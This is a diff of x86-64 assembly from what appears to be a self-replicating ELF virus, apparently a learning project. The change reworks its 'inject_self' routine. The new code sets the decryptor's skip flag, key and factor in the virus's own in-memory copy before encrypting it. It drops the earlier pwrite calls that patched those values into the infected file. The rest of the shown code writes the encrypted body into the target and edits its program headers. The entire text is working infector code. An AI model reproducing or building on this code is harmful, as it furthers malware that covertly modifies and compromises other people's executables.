@@ -412,6 +412,22 @@ inject_self:
 		cmp rdx, 0
 		jg .loading_v
 
+
+	lea r10, STACK(famine.tocypher)
+	add r10,JUMP_DECYPHER_OFFSET
+	mov byte[r10], 0
+	
+	lea r10, STACK(famine.tocypher)
+	add r10, KEY_OFFSET
+	mov r11b, STACK(famine.key)
+	mov byte[r10], r11b
+
+	lea r10, STACK(famine.tocypher)
+	add r10, FACTOR_OFFSET
+	mov r11b, STACK(famine.factor)
+	mov byte[r10], r11b
+
+
 	push r12
 	CYPHER
 	pop r12
@@ -423,35 +439,8 @@ inject_self:
 	push r10
 	mov rax, _pwrite
 	syscall
-
 	cmp rax, 0
 	jbe .return
-
-	mov rdi, STACK(famine.file_fd) ; fd to rdi
-	mov rax, _pwrite			;OVERWRITE THE JUMP OVER DECYPHER METHOD WITH VALUE 0
-	lea rsi, [rel signature]
-	mov rdx, 1
-	add r10, JUMP_DECYPHER_OFFSET ; JUMP OVER DECYPHER VAL OFFSET
-	syscall
-
-	pop r10
-	push r10
-	mov rdi, STACK(famine.file_fd) ; fd to rdi
-	mov rax, _pwrite			;OVERWRITE THE VALUE OF KEY IN DECYPHER
-	lea rsi, STACK(famine.key)
-	mov rdx, 1
-	add r10, KEY_OFFSET ;  KEY OFFSET
-	syscall
-
-	pop r10
-	push r10
-	mov rdi, STACK(famine.file_fd) ; fd to rdi
-	mov rax, _pwrite			;OVERWRITE THE FACTOR VALUE
-	lea rsi, STACK(famine.factor)
-	mov rdx, 1
-	add r10, FACTOR_OFFSET ; KEY FACTOR OFFSET
-	syscall
-
 
 	.edit_phdr:
 	pop rax				;RDI = the offset of patched PHEADER
